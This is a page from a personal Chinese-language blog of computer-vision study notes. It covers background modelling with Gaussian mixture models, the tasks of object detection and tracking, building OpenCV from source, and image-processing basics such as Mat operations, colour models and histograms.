<li>传统的背景建模方法有：中值法背景建模、均值法背景建模、单高斯分布模型、混合高斯分布模型、卡尔曼滤波器模型以及高级背景模型等，这些方法都是基于像素的亮度值进行数学计算处理，所以我们说运动目标检测是基于统计学原理。<ol>
<li>中值法背景建模：在一段时间内，取连续N帧图像序列，把这N帧图像序列中对应位置的像素点灰度值按从小到大的顺序排列，然后取中间值作为背景图像中对应像素点的灰度值；</li>
<li>均值法背景建模：在视频图像中取连续N帧，计算这N帧图像像素灰度值的平均值来作为背景图像的像素灰度值</li>
<li>卡尔曼滤波器模型：该算法把背景认为是一种稳态的系统，把前景图像认为是一种噪声，用基于Kalman滤波理论的时域递归低通滤波来预测变化缓慢的背景图像，这样既可以不断地用前景图更新背景，又可以维持背景的稳定性消除噪声的干扰；</li>
<li>单高斯分布模型：其基本思想是，将图像中每一个像素点的灰度值看成是一个随机过程X，并假设该点的某一像素灰度值出现的概率服从高斯分布，</li>
<li>多高斯分布模型：将背景图像的每一个像素点按多个高斯分布的叠加来建模，每种高斯分布可以表示一种背景场景，这样的话，多个高斯模型混合使用就可以模拟出复杂场景中的多模态情形</li>
<li>高级背景模型：得到每个像素或一组像素的时间序列模型。这种模型能很好的处理时间起伏，缺点是需要消耗大量的内存。</li>
</ol>
</li>
<li>背景差分法计算十分简单，此外该方法还在一定程度上克服了环境光线的影响。其缺点是不能用于运动的摄像头，同时背景图像的实时更新也并非易事。</li>
<li>背景差分法实现目标检测的四个环节：背景建模、背景更新、目标检测、后期处理。在其中，背景建模和背景更新是背景差分法中的核心问题。</li>
</ol>
<h1 id="高斯混合模型"><a href="#高斯混合模型" class="headerlink" title="高斯混合模型"></a>高斯混合模型</h1><ol>
<li>GMM，高斯混合模型，也可以简写为MOG。高斯模型就是用高斯概率密度函数（正态分布曲线）精确地量化事物，将一个事物分解为若干的基于高斯概率密度函数（正态分布曲线）形成的模型。</li>
<li>GMMs已经在数值逼近、语音识别、图像分类、图像去噪、图像重构、故障诊断、视频分析、邮件过滤、密度估计、目标识别与跟踪领域取得了良好的效果。</li>
<li>对图像背景建立高斯模型的原理及过程：<ol>
<li>图像灰度直方图反映的是图像中某个灰度值出现的频次，也可以认为是图像灰度概率密度的估计。如果图像所包含的目标区域和背景区域相比比较大，且背景区域和目标区域在灰度上有一定的差异，那么该图像的灰度直方图呈现双峰-谷形状，其中一个峰对应于目标，另一个峰对应于背景的中心灰度。对于复杂的图像，尤其是医学图像，一般是多峰的。通过将直方图的多峰特性看作是多个高斯分布的叠加，可以解决图像的分割问题。在智能监控系统中，对于运动目标的检测是中心内容，而在运动目标检测提取中，背景目标对于目标的识别和跟踪至关重要，而建模正是背景目标提取的一个重要环节。</li>
<li>混合高斯模型使用K（基本为3到5个）个高斯模型来表征图像中各个像素的特征，在新一帧图像获得后更新混合高斯模型，用当前图像中的每个像素点与混合高斯模型匹配，如果成功则判定该点为背景点，否则为前景点。</li>
<li>通观整个高斯模型，主要是由方差和均值两个参数决定，对均值和方差的学习，采用不同的学习机制，将直接影响到模型的稳定性、精确性和收敛性。</li>
<li>由于是对运动目标的背景提取建模，因此需要对高斯模型中方差和均值两个参数实时更新。为提取模型的学习能力，改进方法对均值和方差的更新采用不同的学习率；为提高在繁忙的场景下，大而慢的运动目标的检测效果，引入权值均值的概念，建立背景图像并实时更新，然后结合权值、权值均值和背景图像对像素点进行前景和背景的分类</li>
<li>主要步骤：<ol>
<li>为图像的每个像素点指定一个初试的均值、标准差及权重。</li>
<li>收集N（一般取200以上，否则很难得到像样的结果）帧图像利用在线EM算法得到每个像素点的均值、标准差以及权重</li>
<li>从N+1帧开始检测，检测的方法，对每个像素点：<ol>
<li>将所有的高斯核按照ω &#x2F; σ 降序排序</li>
<li>选择满足公式的前M个高斯核：M &#x3D; arg min(ω &#x2F; σ &gt; T)</li>
<li>如果当前像素点的像素值其中有一个满足：就可以认为其为背景点</li>
<li>更新背景图像，用在线EM算法<ol>
<li>EM算法（Expectation Maximization）算法是由Dsmpser、Laind和Rubin在1977年提出的一种求参数的极大似然估计方法，可以广泛地应用于处理缺损数据、截尾数据等带有噪声的不完整数据。</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
<li>背景与前景：<ol>
<li>前景是指在假设背景为静止的情况下，任何有意义的运动物体即为前景。建模的基本思想是从当前帧中提取前景，其目的是使背景更加接近当前视频帧的背景。即利用当前帧和视频序列中的当前背景帧进行加权平均来更新背景，但是由于光照突变以及其他外界环境的影响，一般的建模后的背景并非十分干净清晰，而高斯混合模型是建模最为成功的方法之一。</li>
<li></li>
</ol>
</li>
</ol>
<h1 id="计算机视觉领域：目标分割、目标识别、目标检测和目标跟踪"><a href="#计算机视觉领域：目标分割、目标识别、目标检测和目标跟踪" class="headerlink" title="计算机视觉领域：目标分割、目标识别、目标检测和目标跟踪"></a>计算机视觉领域：目标分割、目标识别、目标检测和目标跟踪</h1><h2 id="目标分割"><a href="#目标分割" class="headerlink" title="目标分割"></a>目标分割</h2><ol>
<li>目标分割是要把目标对应的部分分割出来，分出前景和背景，并将背景去除。将图像输入模型以后，模型对图像进行逐帧预测，目标涉及的每个像素都标注出来。目标分割一般要求的精度较高。</li>
<li>它本质上也是一个分类任务，但是与图像识别不同，它不是对整个图像进行分类，而是对图像中的逐像素进行分类，例如日常在辅助驾驶中看到的车道线标注，这就是其中之一的应用</li>
</ol>
<h2 id="目标识别"><a href="#目标识别" class="headerlink" title="目标识别"></a>目标识别</h2><ol>
<li>目标识别就是将目标的类型进行分类，针对整个图像进行分类，一般基于深度学习方法。</li>
<li>把图像输入到模型中，模型会识别出图像中的目标是什么。这本质上是一个分类任务，即把图像中的目标进行分类，最终输出它是属于哪个类别的目标。</li>
<li>当我们想知道图像中具体在哪里时，仅能完成分类任务的图像识别就不能胜任了；同时，如果我们想知道图像中具体包括多少数量的同类目标时，分类任务也无法给出合理的答案</li>
</ol>
<h2 id="目标检测"><a href="#目标检测" class="headerlink" title="目标检测"></a>目标检测</h2><ol>
<li>目标检测就是检测图片中目标的具体位置和尺寸，也就是目标定位在图像分类的基础上，进一步判断目标具体在图像中的位置，一般是以bounding box的形式出现的。</li>
<li>把图像输入到模型中，模型需要给出回归的位置标注，除此之外，还需要给出标注位置内的目标是什么。它同事兼顾了目标的位置标注任务，以及目标的识别任务</li>
</ol>
<h2 id="目标跟踪"><a href="#目标跟踪" class="headerlink" title="目标跟踪"></a>目标跟踪</h2><ol>
<li>目标追踪，也成为目标跟踪，基于目标定位实时追踪目标所在的位置，主要用于视频中，利用图像帧之间的时序关系。</li>
<li>目标被识别以后，算法需要在接下来的时序数据中快速高效的对目标进行再定位。区别类似的目标可以避免不必要的重复计算，利用时序相关性，对一些简单的旋转、遮盖、缩小、放大等线性或非线性变化具有鲁棒性。也就是对视频中的ROI连续检测，输出每一帧图像的bounding box</li>
<li>目标跟踪一般建立在目标检测和目标分割之上，在连续采样的视频或图像中，当我们需要知道同一个目标在相邻视频帧数或图像中的位置识别时，目标跟踪可以很好的完成这个任务。</li>
</ol>
<h2 id="综上所述，目标识别（图像识别）、目标检测、目标分割以及目标跟踪，它们有着一定的联系，大部分的任务都是建立在目标识别的基础上，而目标跟踪又是在目标检测和目标分割的扩展应用。"><a href="#综上所述，目标识别（图像识别）、目标检测、目标分割以及目标跟踪，它们有着一定的联系，大部分的任务都是建立在目标识别的基础上，而目标跟踪又是在目标检测和目标分割的扩展应用。" class="headerlink" title="综上所述，目标识别（图像识别）、目标检测、目标分割以及目标跟踪，它们有着一定的联系，大部分的任务都是建立在目标识别的基础上，而目标跟踪又是在目标检测和目标分割的扩展应用。"></a>综上所述，目标识别（图像识别）、目标检测、目标分割以及目标跟踪，它们有着一定的联系，大部分的任务都是建立在目标识别的基础上，而目标跟踪又是在目标检测和目标分割的扩展应用。</h2><h1 id="计算机视觉（大黑书）"><a href="#计算机视觉（大黑书）" class="headerlink" title="计算机视觉（大黑书）"></a>计算机视觉（大黑书）</h1><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><ol>
<li>计算机视觉的研究目标是，根据感测到的图像对实际物体和场景做出有意义的判定。为了对实际物体做出判定，总是需要根据图像来构造它的某个描述或模型，因此专家们会说计算机视觉的目标是根据图像来构造出对场景的描述。</li>
<li>数字图像包含固定的像素（pixel）行数与列数，像素是图像元素（picture element）的缩写。</li>
<li>多幅图像运算：<ol>
<li>两幅图像相加或者相减可以得到一副新图像。一般用图像减法检测图像随时间的变化。</li>
</ol>
</li>
<li>图像类型：<ol>
<li>在图像计算中，要了解模拟图像（analog image）和数字图像（digital image）两个概念。<ol>
<li>模拟图像是指二维图像F（x, y），其空间参数x和y具有无限精度，在每个空间点（x，y）的光强也具有无限精度</li>
<li>数字图像是指二维图像I（r，c），用离散的二维光强阵列表示，光强的精度是有限的。</li>
</ol>
</li>
</ol>
</li>
</ol>
<h1 id="mooc"><a href="#mooc" class="headerlink" title="mooc"></a>mooc</h1><p>数字图像处理：<br>    数字图像，是由模拟图像数字化得到的，以像素为基本元素的图像<br>    数字图像处理（Digital Image Processing）又称为计算机图像处理，它是指用数字计算机或数字电路对数字图像进行处理的。</p>
<p>几个相关领域：<br>    数字图像处理：图像增强、图像复原、图像压缩、图像变换、图像描述等。<br>    计算机视觉：工业检测、图像识别、图像检索、图像理解等<br>    计算机图形学：仿真、工业设计、游戏、电影特效<br>    人工智能：对信息分析、控制、决策</p>
<p>学习内容和学习建议：<br>    设计的专业知识<br>        高等数学、概率论、线性代数、矩阵理论、数字信号处理、最优化理论、运筹学、图论、几何学、机器学习<br>    数字图像处理设计的编程知识：<br>        C++  Python  matlab<br>    常用数字图像处理开发库：<br>        Opencv </p>
<p>参考书目：<br>    《数字图像处理》 Rafael,C,Gonzalez<br>    《OpenCV3编程入门》毛星云</p>
<hr>
<p>Opencv简介：<br>    OpenCV,1999年由Intel建立，开源的跨平台计算机视觉库，<br>    主页：<a target="_blank" rel="noopener" href="https://opencv.org/">https://opencv.org/</a></p>
<p>编译原理简介：<br>    C&#x2F;C++代码编译过程：<br>        C语言的编译链接过程要把编写的C程序（源代码）转换成可以在硬件上运行的程序（可执行代码）<br>    分为两个部分：编译和链接<br>        编译，就是把文本形式源代码翻译为机器语言形式的目标文件的过程<br>            编译过程又分为两个阶段：编译和汇编<br>                在编译阶段，编译器会首先进行预处理，预处理主要对下面的内容进行处理：1）宏定义指令，2）条件编译指令，3）头文件包含指令，4）特殊符号。编译阶段，编译器还会进行一些优化，检查语法规则，然后会把代码生成为汇编码。<br>                汇编阶段会把汇编码生成为目标机器所能够读取的机器码。<br>        链接，就是把目标文件、操作系统的启动代码和用到的库文件进行组织，形成最终生成可执行代码的流程<br>            编译阶段生成的机器码实际上还不能马上运行。因为opencv头文件中只有函数的定义，没有函数的内容。函数的内容通常是封装在dll动态库（Linux下为.so后缀文件）或者lib静态库（Linux下为.a后缀文件）文件中，那么在链接阶段，就需要告诉编译器，去哪里找这些库文件，以及库文件的名称。 </p>
<p>编译安装Opencv：</p>
<ul>
<li>安装配置环境<ul>
<li>安装<code>cmake</code></li>
<li>安装环境依赖<code>build-essential libgtk2.0-dev libavcodec-dev libavformat-dev libjpeg-dev libswscale-dev libtiff5-dev	libgtk2.0-dev pkg-config</code></li>
</ul>
</li>
<li>安装Opencv：<ul>
<li>下载压缩文件</li>
<li>在opencv目录下： <code>mkdir build &amp;&amp; cd build</code></li>
<li>编译Opencv： <code>cmake -D CMAKE_BUILD_TYPE=Release -D CMAKE_INSTALL_PREFIX=/usr/local/ ..  &amp;&amp; make -j8 &amp;&amp; make install </code></li>
</ul>
</li>
<li>配置环境：<ul>
<li><code>/etc/ld.so.conf</code> 文件添加 <code>/usr/local/lib</code></li>
<li><code>/etc/bash.bashrc</code> 文件添加 <code>PKG_CONFIG_PATH=$PKG_CONFIG_PATH:/usr/local/lib/pkgconfig</code>  &amp;&amp; <code>export PKG_CONFIG_PATH</code></li>
<li><code>source /etc/bash.bashrc</code></li>
</ul>
</li>
<li>检验：<ul>
<li><code>pkg-config opencv --modversion</code></li>
</ul>
</li>
</ul>
<p>Opencv的基本数据格式：<br>    OpenCV早期版本中，采用IplImage格式来保存图像，到2.0以后的版本，引入面向对象的思想，采用C++重写了大量代码，并引入Mat类作为图像容器。Mat（matrix）类本身是一个矩阵格式，也可以用来保存图像</p>
<p>Mat的基本操作：<br>1.)创建：opencv提供了很多方法创建mat<br>1.1)使用Mat()构造函数<br>    cv::Mat M1(2,2,CV_8UC3,Scalar(0,0,255))<br>    这个函数的意思是，创建了一个名为M1的Mat，改Mat的尺寸为2,2，类型为CV_8UC3，即8位uchar类型，C3是指该Mat通道数为3.这个Mat的每一个元素包含了3个通道或者说3个数值，然后用0,0,255为每一个元素赋值。<br>    这里8位uchar类型的取值为0~255，实际上如果一个Mat是用来表示RGB图像的时候应该声明为CV_8UC3型。<br>    Mat型可以定义各种类型，定义的方式：CV_(位数)+(数据类型)+(通道数)<br>1.2)使用create()函数<br>    cv::Mat M3;<br>    M3.create(3,4,CV_8UC3);<br>    表示首先声明一个mat型，名为M3，其尺寸为3行，4列。</p>
<p>2.)复制<br>2.1)浅复制<br>    cv::Mat srcM(2,2,CV8UC3,Scalar(0,0,255));<br>    cv::Mat dstM;<br>    dstM &#x3D; srcM;<br>    表示首先声明一个mat名为srcM，并初始化，然后声明一个mat名为dstM，通过 &#x3D; 把srcM复制给dstM<br>    这样生成的矩阵，只是新生成一个矩阵头，dstM的data依然指向矩阵srcM的data，类似C++中的浅拷贝<br>2.2)深复制<br>    cv::Mat srcM(2,2,CV_8UC3,Scalar(0,0,255));<br>    cv::Mat dstM;<br>    srcM.copyTo(dstM);<br>    通过copyTo函数，可以实现深复制，也就是dstM是一个全新的矩阵，他在内存中的地址和srcM是不一样的，另外copyTo函数还可以加上掩模参数。</p>
<p>3.)遍历Mat：当我们想读取或者修改Mat的任意内容的时候，可以用以下方式访问Mat<br>3.1)利用指针.ptr</p>
<hr>
<p>数字图像的基本概念<br>1.)数字图像的硬件介绍<br>1.1)图像输入设备：输入，采样量化，专用处理。（相机、摄像机、扫描仪等）<br>1.1.1)线阵相机和面阵相机<br>    面阵相机：一次拍摄一个区域，视觉检测中绝大部分应用面阵相机<br>    线阵相机：一次拍摄一行像素，通过移动以及拼接来获取图像，分辨率更高，成像质量更高，价格更贵<br>1.2)电脑：数字图像处理（PC机，服务器集群，硬件电路等）<br>1.3)图像输出设备：专用处理，D&#x2F;A转换，输出。（打印机、显示器等）</p>
<p>2.)数字图像的几个基本概念<br>2.1)图像的采样和量化<br>    数字化坐标值称为采样<br>    数字化幅度值称为量化<br>2.2)图像的分辨率<br>    采样的程度通常用采样率来表示，也就是通常所说的分辨率。分辨率160 × 128 的意思是水平像素数为160个，垂直像素数128个。分辨率越高，像素的数目越多，感受的图像越精密<br>2.3)图像的灰度级<br>    最常见的图像为8位图像，灰度级为256级，即2的8次方。<br>    灰度级越多，可以展现的图像细节就越多，有时候也把灰度级称为灰度分辨率。<br>2.4)图像的坐标系<br>    在图像中，如果要表示图像中的某一个像素，可以用它的坐标来表示<br>    图像原点为图像的左上角，坐标记做[0,0]<br>    一副M × N的图像可以用一个矩阵来表示<br>2.5)像素的空间关系：8-邻接和4-邻接<br>3.)数字图像的种类和色彩模型<br>3.1)图像的种类<br>3.1.1)二值图像：<br>    像素取值仅为0和1，“0“代表黑色，”1“代表白色。通常用来表示状态，如区分图像中的前景和背景<br>3.1.2)灰度图像：<br>    像素取值范围为[0,255]，”0”表示纯黑，“255”表示纯白色，一些图像算法中需要使用灰度图进行运算<br>3.1.3)彩色图像：<br>    显示设备通常使用RGB格式的彩色图像，即红（red）绿（green）蓝（blue）三种颜色的组合叠加起来获得各种颜色。<br>    如果把RGB值看做是3个维度的坐标，构建的空间称为RGB色彩空间<br>    除了RGB外，常见的色彩模型还有HSV&#x2F;HSI（数字图像算法常用），CMYK（主要用于印刷），YUV（用于图像传输）<br>3.2)色彩模型：通过数学模型表示颜色，所用的数学模型即颜色模型。<br>3.2.1)CMYK色彩模型<br>    印刷业通过青（C）、品（M）、黄（Y）三原色油墨的不同网点面积率的叠印来表现颜色，一般采用青（C）、品（M）、黄（Y）、黑（BK）四色印刷。<br>    CMYK可以看做是从黑色中减少颜色得到新的颜色，故可以称之为减色模型。而RGB是在白色上叠加颜色得到新的颜色，故称为加色模型。<br>3.2.2)HSV色彩模型<br>    HSV即色相（Hue）、饱和度（Saturation）、明度（Value），又称HSI（I即intensity）。常用于图像算法中的色彩分析，对光照具有较强的鲁棒性。<br>    H：用角度表示，从红色开始按逆时针方向计算，红色为0度，绿色为120度，蓝色为240度，该值表示颜色接近于哪种纯色值<br>    S：通常取值范围为0%~100%。圆锥的中心为0，该值越大表示颜色越饱满，直观的说即颜色深而艳<br>    V：亮度，表示颜色的明亮程度<br>4.)图像直方图<br>4.1)图像的直方图<br>    直方图（histogram）是图像处理中的一个非常重要工具，被广泛应用。直方图本质是概率分布的图形化，同时直方图也可以用来表示向量。<br>4.1.1)直方图的作用<br>    图像匹配：比较两幅图像的直方图，可以得到两幅图像的相似程度，其本质是对比灰度出现的概率是否相似<br>    判断成像质量<br>    二值化阈值：所谓二值化即通过设置一个门限值，把灰度图像转换为二值化图像，通常的目的是分离前景和背景。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/OpenCV/opencv_3_%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/2024-05-22--%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B002/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/OpenCV/opencv_3_%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/2024-05-22--%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B002/" class="post-title-link" itemprop="url">常用函数</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-06-05 13:31:10" itemprop="dateModified" datetime="2025-06-05T13:31:10+08:00">2025-06-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/OpenCV/" itemprop="url" rel="index"><span itemprop="name">OpenCV</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>OpenCV 常用的函数</li>
</ul>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2024/05/22/notebook/OpenCV/opencv_3_%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/2024-05-22--%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B002/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/30/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/30/">30</a><span class="page-number current">31</span><a class="page-number" href="/page/32/">32</a><span class="space">&hellip;</span><a class="page-number" href="/page/34/">34</a><a class="extend next" rel="next" href="/page/32/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">zhang junyi</p>
  <div class="site-description" itemprop="description">工作学习笔记</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">672</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">54</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">98</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/junyiha" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;junyiha" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://x.com/zhangjunyiha" title="Twitter → https:&#x2F;&#x2F;x.com&#x2F;zhangjunyiha" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">zhang junyi</span>
</div>

<!--
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>
-->

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
